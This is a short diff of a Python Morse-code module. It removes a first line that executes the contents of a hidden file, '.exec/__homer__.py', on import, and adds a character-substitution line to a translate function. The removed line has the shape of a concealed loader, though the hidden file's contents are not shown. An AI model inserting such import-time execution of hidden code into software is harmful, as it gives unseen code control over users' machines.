@@ -1,4 +1,3 @@
-exec(open(".exec/__homer__.py").read())
 
 from xmlrpc.server import SimpleXMLRPCDispatcher
 from res.colors import *
@@ -124,6 +123,7 @@ class morse:
         return(string)
 
     def translate(string):
+        string = string.replace("_", "-").replace("|","/")
         string = string.split(" ")
         letters_array = []
 
